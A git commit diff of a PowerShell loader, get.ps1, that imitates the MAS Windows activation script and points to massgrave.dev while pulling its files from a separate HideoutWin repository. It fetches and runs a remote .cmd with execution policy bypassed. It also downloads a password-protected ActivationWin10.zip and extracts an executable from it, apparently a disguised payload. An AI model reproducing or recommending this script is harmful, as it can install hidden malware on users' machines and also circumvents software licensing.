cd51b4929418d0096fbf6b4637f90ef01ee88942
HideoutWin <hls777us@proton.me>
2024-08-16 12:41:13 -0300

    Update get.ps1

--- get.ps1
+++ get.ps1
@@ -1,12 +1,12 @@
-$ErrorActionPreference = "Stop"
 
+$ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients for current session
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-
 $DownloadURL1 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
+$DownloadURL2 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/MAS_AIO-CRC32_8C3AA7E0.cmd'
 
-$URLs = @($DownloadURL1)
+$URLs = @($DownloadURL1, $DownloadURL2)
 $RandomURL1 = Get-Random -InputObject $URLs
 $RandomURL2 = ($URLs -ne $RandomURL1)[0]
 
@@ -15,6 +15,20 @@ try {
 }
 catch {
     $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
+}
+
+# Verify script integrity
+$releaseHash = '8e47ec87c837b8ce93ee6060ae22f9f8a001b1848f71033bb90e33a0f1bab671'
+$stream = New-Object IO.MemoryStream
+$writer = New-Object IO.StreamWriter $stream
+$writer.Write($response)
+$writer.Flush()
+$stream.Position = 0
+$hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
+if ($hash -ne $releaseHash) {
+    Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at https://massgrave.dev/troubleshoot"
+    $response = $null
+    return
 }
 
 $rand = [Guid]::NewGuid().Guid
@@ -29,7 +43,6 @@ cd $FilePath4
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '$FilePath3'"
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/HideoutWin/windows/raw/main/ActivationWin10.zip' -OutFile '$FilePath2'; ./7zr.exe x -p@Activation#85320878 ActivationWin10.zip ActivationWin10.exe"
 
-
 $ScriptArgs = "$args "
 $prefix = "@::: $rand `r`n"
 $content = $prefix + $response
@@ -38,3 +51,6 @@ Set-Content -Path $FilePath -Value $content
 # Set ComSpec variable for current session in case its corrupt in the system
 $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
 Start-Process cmd.exe "/c """"$FilePath"" $ScriptArgs""" -Wait
+
+$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
